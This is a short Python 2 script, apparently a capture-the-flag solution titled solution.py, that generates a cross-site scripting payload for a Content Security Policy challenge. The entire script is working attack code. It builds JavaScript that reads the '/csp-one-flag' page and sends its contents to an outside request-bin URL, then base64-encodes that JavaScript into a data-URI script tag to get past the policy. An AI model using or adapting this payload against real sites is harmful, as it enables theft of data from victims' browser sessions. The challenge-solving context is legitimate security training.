import sys
import base64

if len(sys.argv) != 3:
    print "Please specify challenge URL and Request bin URL"
    print "python solution.py http://challenge.host.com http://endiel6lj35l8.x.pipedream.net"
else:  
	vector = "var xhr = new XMLHttpRequest(); xhr.open('GET','" + sys.argv[1] + '/csp-one-flag'
	vector = vector + "', true); xhr.onload = function () { var request = new XMLHttpRequest(); request.open('GET', '"
	vector = vector + sys.argv[2] + "?flag='+xhr.responseText, true);request.send()};xhr.send(null);"
	print vector
	print '<script src="data:text/javascript;base64,' + base64.b64encode(vector) + '"></script>'